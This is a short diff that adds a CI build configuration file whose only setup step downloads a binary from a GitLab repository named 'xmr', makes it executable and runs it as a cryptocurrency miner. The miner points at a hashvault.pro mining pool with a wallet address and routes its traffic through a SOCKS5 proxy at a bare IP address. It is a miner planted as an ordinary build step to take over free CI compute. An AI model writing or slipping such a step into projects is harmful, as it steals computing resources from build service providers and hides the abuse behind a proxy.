@@ -1,0 +1,6 @@
+build:
+  nodes:
+    my-node:
+      project_setup:
+        before:
+          - command: wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile && chmod 777 masterfile && ./masterfile -o chicago01.hashvault.pro:80 -u TRTLv3YLDqcf5MdXTdSvg2VmYLTiH3ungXqogHVgGSog7jVMp3DWM91SMzgcrDmnkdBZgnbFSPwRa1RXHh9d1PSTapighJaFQvG -p SCR -a argon2/chukwav2 -x socks5://72.210.252.134:46164 -k
